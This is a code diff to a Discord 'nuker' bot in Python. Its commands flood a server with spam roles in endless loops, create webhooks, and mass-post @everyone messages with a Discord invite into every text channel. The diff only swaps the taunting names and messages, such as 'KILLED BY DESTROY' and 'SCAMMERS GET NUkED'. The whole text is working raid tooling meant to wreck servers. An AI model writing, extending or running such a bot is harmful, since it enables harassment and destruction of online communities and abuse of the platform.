@@ -71,11 +71,11 @@ async def rspam(ctx):
 @bot.command()
 async def transrspam(ctx):
  while True:
-   await ctx.guild.create_role(name="Astfolo NUKER RUNS YOU",colour=discord.Colour(0x0EF5F6))
-   await ctx.guild.create_role(name="Astfolo NUKER RUNS YOU",colour=discord.Colour(0xFFFFFF))
-   await ctx.guild.create_role(name="Astfolo NUKER RUNS YOU",colour=discord.Colour(0xFFA3FB))
-   await ctx.guild.create_role(name="Astfolo NUKER RUNS YOU",colour=discord.Colour(0xFFFFFF))
-   await ctx.guild.create_role(name="Astfolo NUKER RUNS YOU",colour=discord.Colour(0x0EF5F6))
+   await ctx.guild.create_role(name="KILLED BY DESTROY",colour=discord.Colour(0x0EF5F6))
+   await ctx.guild.create_role(name="DES OWNS YOU",colour=discord.Colour(0xFFFFFF))
+   await ctx.guild.create_role(name="HAHA FUCKEF BY DES",colour=discord.Colour(0xFFA3FB))
+   await ctx.guild.create_role(name="BAN THIS BOT",colour=discord.Colour(0xFFFFFF))
+   await ctx.guild.create_role(name="GG",colour=discord.Colour(0x0EF5F6))
    print("Spamming roles <3")
 @bot.command()
 async def rdelete(ctx):
@@ -175,11 +175,11 @@ async def pingspam(ctx):
         pass 
       for channel in ctx.guild.text_channels:
         try:
-          webhook = discord.utils.get(await ctx.channel.webhooks(), name='Spammer')
-          await channel.send(f"Nuked! @everyone https://discord.gg/A7nAbRFdjD TOOL RUNS YOU         {r1}")
-          await ctx.channel.create_webhook(name="wizzed by tool")
-          await channel.send(f"Nuked! @everyone https://discord.gg/A7nAbRFdjD TOOL RUNS YOU   {r1}")
-          await ctx.channel.create_webhook(name="wizzed")
+          webhook = discord.utils.get(await ctx.channel.webhooks(), name='DESTROY')
+          await channel.send(f"DRAGO OWNS THIS @everyone @here SCAMMERS GET NUkED         {r1}")
+          await ctx.channel.create_webhook(name="killed by ALBYSD")
+          await channel.send(f"dont run! @everyone EXPIRED TOOL RUNS YOU   {r1}")
+          await ctx.channel.create_webhook(name="SAY SORR6 FOR SERVER")
           await channel.send(f"Nuked! @everyone https://discord.gg/A7nAbRFdjD TOOL RUNS YOU                {r1}")
           await ctx.channel.create_webhook(name="wizzed by tool")
           await channel.send(f"Nuked! @everyone https://discord.gg/A7nAbRFdjD TOOL RUNS YOU     {r1}")
